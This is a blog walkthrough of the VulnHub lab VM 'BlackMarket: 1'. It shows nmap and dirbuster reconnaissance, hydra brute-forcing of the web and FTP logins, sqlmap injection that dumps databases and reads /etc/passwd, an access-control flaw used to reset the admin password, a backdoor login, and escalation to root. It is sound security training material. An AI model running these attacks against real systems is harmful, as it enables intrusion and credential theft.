---
layout: post
date: 2018-06-17 11:33:26 +0000
last_modified_at: 2018-08-03 19:08:05 +0000
title: "BlackMarket: 1 Walkthrough"
subtitle: "Overt, Covert, and Clandestine"
category: Walkthrough
tags: [VulnHub, BlackMarket]
comments: true
image:
  feature: blackmarket-1-walkthrough.jpg
  credit: MasterTux / Pixabay
  creditlink: https://pixabay.com/en/cartridges-weapon-war-hand-gun-2166491/
---

This post documents the complete walkthrough of BlackMarket: 1, a boot2root [VM][1] created by [AcEb0mb3R][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

The BlackMarket VM was first presented at Brisbane SecTalks BNE0x1B. This VM has a total of six flags and one `root` flag. Each flag leads to another and the flag format is `flag{blahblah}`.

### Information Gathering

Let's start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT    STATE SERVICE    REASON         VERSION
21/tcp  open  ftp        syn-ack ttl 64 vsftpd 3.0.2
22/tcp  open  ssh        syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 a9:98:84:aa:90:7e:f1:e6:be:c0:84:3e:fa:aa:83:8a (DSA)
|   2048 07:5c:77:15:30:5a:17:95:8e:0f:91:f0:2d:0b:c3:7a (RSA)
|   256 2f:9c:29:b5:f5:dc:f4:95:07:6d:41:ee:f9:0d:15:b8 (ECDSA)
|_  256 24:ac:30:c7:79:7f:43:cc:fc:23:df:ea:db:bb:4a:cc (ED25519)
80/tcp  open  http       syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: BlackMarket Weapon Management System
110/tcp open  pop3?      syn-ack ttl 64
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap       syn-ack ttl 64 Dovecot imapd
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap   syn-ack ttl 64 Dovecot imapd
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-01T07:05:35
| Not valid after:  2027-11-01T07:05:35
| MD5:   beb8 4ed5 6adc dc0e d595 6678 2039 473e
|_SHA-1: 94b8 f1b8 913e a32b 4ea1 6e58 4252 8a7c c432 c897
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3s? syn-ack ttl 64
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Issuer: commonName=localhost/organizationName=Dovecot mail server
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-11-01T07:05:35
| Not valid after:  2027-11-01T07:05:35
| MD5:   beb8 4ed5 6adc dc0e d595 6678 2039 473e
|_SHA-1: 94b8 f1b8 913e a32b 4ea1 6e58 4252 8a7c c432 c897
|_ssl-date: TLS randomness does not represent time
```

`nmap` finds plenty of open services. But, let's continue our efforts with `http` since there is a higher chance of finding an attack surface here.

### Flag: 1

Indeed, the first flag is in the HTML source of the landing page at `http://192.168.10.130/`.

![Flag: 1](/assets/images/posts/blackmarket-1-walkthrough/0.ib8ttza2a7.png)

I thought the flag's body looked like it's `base64` encoded. This is what I get after decoding it.

```
# echo -n Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU= | base64 -d && echo
CIA - Operation Treadstone
```

Hmm. CIA? Operation Treadstone? Jason Bourne?

Following the trail of the first flag, I google for "CIA - Operation Treadstone" and build a wordlist with `cewl` from the first [result](http://bourne.wikia.com/wiki/Operation_Treadstone)—it might be useful later.

Here's how.

```
# cewl -w cewl.txt http://bourne.wikia.com/wiki/Operation_Treadstone
```

### Directory Fuzzing

Next, I use `dirbuster` with one of the bigger wordlists to fuzz the site—to uncover any directories that are not visible from the get-go.

```
Dir found: / - 200
Dir found: /admin/ - 302
Dir found: /css/ - 403
Dir found: /db/ - 403
Dir found: /dist/ - 403
Dir found: /dist/css/ - 403
Dir found: /dist/js/ - 403
Dir found: /icons/ - 403
Dir found: /server-status/ - 403
Dir found: /squirrelmail/ - 302
Dir found: /supplier/ - 302
Dir found: /upload/ - 403
Dir found: /user/ - 302
Dir found: /vendor/ - 403
```

The fuzz turns up `/squirrelmail` and `/upload`—potential attack surfaces. Files like `/header.php` and `/navbar` are also consistently seen (return code `200`) under `/admin`, `/supplier`, and `/user`, which suggests that the site could be using role-based access.

### BlackMarket Login

This is how the login page looks like.

![BlackMarket Login](/assets/images/posts/blackmarket-1-walkthrough/0.6weguu5c7s.png)

Let's use `hydra` to perform a brute-force login attack on the site and see if we can pick any low-hanging fruit. `usernames.txt` contains `admin`, `supplier` and `user`, and `top10.txt` contains the top-ten passwords found in the dark web.

```
# hydra -L usernames.txt -P top10.txt -f -e nsr -o hydra.txt -t 64 192.168.10.130 http-post-form "/login.php:username=^USER^&password=^PASS^:failed"
[80][http-post-form] host: 192.168.10.130   login: supplier   password: supplier
```

Boom. I'm in. And as you can see, what is in `top10.txt` is unimportant because the password is the same as the username.

![Login Success - supplier](/assets/images/posts/blackmarket-1-walkthrough/0.g3bb3gue5yu.png)

### SQL Injection

I know that I'm looking at a potential SQL injection vulnerability when it involves product ID in a table of products.

![Potential SQL Injection Vulnerability](/assets/images/posts/blackmarket-1-walkthrough/0.9z3g24swagm.png)

The tool for the job is `sqlmap`. I'll need the session cookie to scan for SQLi vulnerabilities. Here's how to get the session cookie from the browser's cookie manager.

![Cookie from Firefox](/assets/images/posts/blackmarket-1-walkthrough/0.foxwz3nrnh8.png)

Next, let's run the cookie through `sqlmap`.

```
sqlmap --cookie="PHPSESSID=og152rg2j9k54tll52l146g9j4" --url=http://192.168.10.130/supplier/edit_product.php?id=1
```

![SQL Injection](/assets/images/posts/blackmarket-1-walkthrough/0.ndsxku3wwn.png)

Awesome. Let's proceed to determine the databases and dump out interesting information from them.

Five databases in MySQL.

![Databases](/assets/images/posts/blackmarket-1-walkthrough/0.ww0hiyl86oe.png)

Ten tables in `BlackMarket`.

![Tables in BlackMarket](/assets/images/posts/blackmarket-1-walkthrough/0.7d9nzmb276f.png)

Five users in `user` table.

![User_Table in BlackMarket](/assets/images/posts/blackmarket-1-walkthrough/0.dlp3yrthkfj.png)

Here's `/etc/passwd` that I read off with `--file-read` command option.

```
root:x:0:0:root:/root:/bin/bash
...
dimitri:x:1000:1000:,,,:/home/dimitri:/bin/bash
jbourne:x:1001:1001::/var/www/html/jbourne:
nicky:x:1002:1002:,,,:/home/nicky:/bin/ftponly
ftp:x:112:120:ftp daemon,,,:/srv/ftp:/bin/false
```

### Flag: 2

Notice that the way for `nicky` to log in is through `ftp`? I know that `ftp` is available from the `nmap` scan. Armed with this information, let's give a shot to `hydra` and the wordlist I built earlier on, and try to brute-force our way in.

```
# hydra -l nicky -P cewl.txt -f -o hydra.txt -e nsr -t 64 ftp://192.168.10.130)
[21][ftp] host: 192.168.10.130   login: nicky   password: CIA
```

The second flag is in the file `IMP.txt`. You can find the file at `/ftp/ImpFiles` after logging in.

```
# cat IMP.txt
flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy}

If anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!
```

It's decoded to this.

```
# echo -n Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy | base64 -d
Congrats Proceed Further
```

Let's proceed further then.

### Flag: 3

The third flag is in the `flag` table—one of the tables in `BlackMarket` database.

![Flag: 3](/assets/images/posts/blackmarket-1-walkthrough/0.qoxa0vrn9b.png)

I'm supposed to find the email access of Jason Bourne; and we know from the results of the `dirbuster` fuzz that `/squirrelmail` exists—a web-based email client.

![SquirrelMail](/assets/images/posts/blackmarket-1-walkthrough/0.ufgx697kl7l.png)

### Flag: 4

Recall the `supplier` login access? Because of poor coding in the role-based access, I can point the URL to a different role such as `/admin` and access their respective landing pages with `supplier`'s session cookie.

![Admin Landing Page](/assets/images/posts/blackmarket-1-walkthrough/0.xeywdl0ado.png)

Besides changing to the landing pages of other roles with the same session cookie, I can also change the login password of any user as long as I know the user ID. Let's change the password of `admin` (`id=1`) through `/edit_customer.php` using Burp Repeater.

![Burp Repeater](/assets/images/posts/blackmarket-1-walkthrough/0.vjdzvr2g4ll.png)

I've changed `admin`'s password to `admin`. The fourth flag is on display once I'm logged in.

![Flag: 4](/assets/images/posts/blackmarket-1-walkthrough/0.b9g442s2qoq.png)

It's decoded to this.

```
# echo -n bm90aGluZyBpcyBoZXJl | base64 -d && echo
nothing is here
```

Trolled—the decoded message says "nothing is here".

### Flag: 5

Since there's a tendency of trolling, could `?????` be the password to Jason Bourne email access?

![Login Success - jbourne](/assets/images/posts/blackmarket-1-walkthrough/0.f45j0gwoq6.png)

Sure enough, I got in with the credential (`jbourne:?????`).

Looking into **INBOX.Drafts** lies the fifth flag and an encrypted message from putin@kgb.gov.ru. No prize for guessing who that is :wink:

![Flag: 5](/assets/images/posts/blackmarket-1-walkthrough/0.yyg8yhsrie.png)

It's decoded to this.

```
# echo -n RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ= | base64 -d && echo
Everything is encrypted
```

Duh. The decoded flag offers nothing of value.

### Decryption

It's obvious that we are looking at some kind of substitution cipher. The method to decipher it—is to look for words with repeated characters. For example, straight up we have "Wrnrgir", which is a substitution for "Dimitri". As such, the first line is "Hi Dimitri".

Moving on to the word "zxxvhh", which has two pairs of repeated characters—we can turn to regular expression and a dictionary to help us find the next substitution candidate.

```
# grep -P '^[a-z]([a-z])\1[a-z]([a-z])\2$' /usr/share/dict/words
abbess
access
appall
assess
bootee
hoodoo
muumuu
peewee
teepee
voodoo
```

The substitution candidate is possibly "access" as the other words don't make contextual sense in the message.

As I piece together the substitution candidates and the contextual clues, I come to realize the substitution key is the reverse alphabet set. I wrote a simple bash script to decrypt the whole message.

<div class="filename"><span>decrypy.sh</span></div>
```bash
#!/bin/bash

SET1=$((echo -n {a..z}; echo -n {A..Z}) | tr -d ' ')
SET2=$((echo -n {z..a}; echo -n {Z..A}) | tr -d ' ')

cat $1 | tr $SET1 $SET2
```

Let's decrypt the message.

```
# ./decrypt.sh encrypted.txt
Hi Dimitri
If you are reading this I might be not alive. I have place a backdoor in Blackmarket
workshop under /kgbbackdoor folder you must have to use
PassPass.jpg in order to get access.
```

### BlackMarket Auto Workshop

Hmm. Another web application? I got a `404 - Not Found` when I navigated to `/eworkshop` following the trail.

Not knowing how to proceed, I use the following command hoping that I'll be lucky enough to locate the web application by switching out the letter before `workshop` with all the alphabetical letters.

```
# for c in {a..z}; do printf "/${c}workshop/: %d\n" $(curl -s -w %{http_code} -o /dev/null 192.168.10.130/${c}workshop/); done
/aworkshop/: 404
/bworkshop/: 404
/cworkshop/: 404
/dworkshop/: 404
/eworkshop/: 404
/fworkshop/: 404
/gworkshop/: 404
/hworkshop/: 404
/iworkshop/: 404
/jworkshop/: 404
/kworkshop/: 404
/lworkshop/: 404
/mworkshop/: 404
/nworkshop/: 404
/oworkshop/: 404
/pworkshop/: 404
/qworkshop/: 404
/rworkshop/: 404
/sworkshop/: 404
/tworkshop/: 404
/uworkshop/: 404
/vworkshop/: 200
/wworkshop/: 404
/xworkshop/: 404
/yworkshop/: 404
/zworkshop/: 404
```

The web application is at `/vworkshop`. Wait a minute! Didn't the second flag mention **Vehical workshop**? I got trolled again.

![BlackMarket Workshop](/assets/images/posts/blackmarket-1-walkthrough/0.drh14ev63nm.png)

### KGB Backdoor

From the decrypted message, we got to know that a backdoor is in the BlackMarket Auto Workshop and that we need `PassPass.jpg` to gain access to it. Here's how `PassPass.jpg` looks like.

![PassPass.jpg](/assets/images/posts/blackmarket-1-walkthrough/0.8hfnu6g9x1j.png)

Like they always say—the devil is in the detail.

```
# strings PassPass.jpg | tail -1
Pass = 5215565757312090656
```

### Backdoor Login

This time round, I rely on good ol' fashion guesswork to determine the location of the backdoor. It's at `/vworkshop/kgbbackdoor/backdoor.php`.

![backdoor.php](/assets/images/posts/blackmarket-1-walkthrough/0.s3vwa3ng4w.png)

From the HTML source of the page, it's obvious that to access the backdoor, I need to submit a `POST` request with password. To that end, I wrote a simple HTML login form.

{% highlight html linenos %}
<html>
  <head>
    <style>
      body {
        width: 300px;
        height: 100px;
        margin: 0 auto;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 100px;
      }
    </style>
    <title>Backdoor Login</title>
  </head>
  <body>
    <div class="login">
      <h2>Come on, let's do this!</h2>
      <form action="http://192.168.10.130/vworkshop/kgbbackdoor/backdoor.php" method="post">
        <input name="pass" type="password" />
        <button type="submit">Login</button>
      </form>
    </div>
  </body>
</html>
{% endhighlight %}

And … `5215565757312090656` is not the password—too bad.

![Failed Login](/assets/images/posts/blackmarket-1-walkthrough/0.d1oy6u6w75t.png)

This prompts me to look deeper into `5215565757312090656`. Notice that it has nineteen digits, an odd number—there's no way this is hexadecimal; it's an integer.

Next, I convert the integer into hexadecimal and print it out as ASCII.

```
# printf "%x\n" 5215565757312090656 | xxd -p -r
HailKGB
```

This is more like it.

![KGB Backdoor](/assets/images/posts/blackmarket-1-walkthrough/0.e4yov7k59cf.png)

Boom. I'm in.

### Flag: 6

The sixth flag is at the home directory of the backdoor.

![Flag: 6](/assets/images/posts/blackmarket-1-walkthrough/0.hv89dztx7xs.png)

It's decoded to this.

```
# echo -n Um9vdCB0aW1l | base64 -d && echo
Root time
```

I must be getting close.

### Dimitri Hates Apple

I get it—Dimitri hates Apple products.

![Dimitri Hates Apple](/assets/images/posts/blackmarket-1-walkthrough/0.az52lg1aat.png)

Having gone so far into this challenge, I'm pretty sure this is the password for `dimitri`'s account. In fact, I got in without realizing that I typed `DimitriHateApple` instead `DimitryHateApple`. What a stroke of luck!

![Login Success - dimitri](/assets/images/posts/blackmarket-1-walkthrough/0.w0kkzwogx9i.png)

### Root Time

My lucky streak continues—`dimitri` is able to `sudo` as `root`.

![sudo](/assets/images/posts/blackmarket-1-walkthrough/0.vxk49yhov1.png)

Time to be `root` and call it a day.

![The End](/assets/images/posts/blackmarket-1-walkthrough/0.8ct87zflfpe.png)

:dancer:

### Decoded Flags

```
1. CIA - Operation Treadstone
2. Congrats Proceed Further
3. Find Jason Bourne Email access
4. nothing is here
5. Everything is encrypted
6. Root time
```

[1]: https://www.vulnhub.com/entry/blackmarket-1,223/
[2]: https://twitter.com/@Acebomber911
[3]: https://www.vulnhub.com
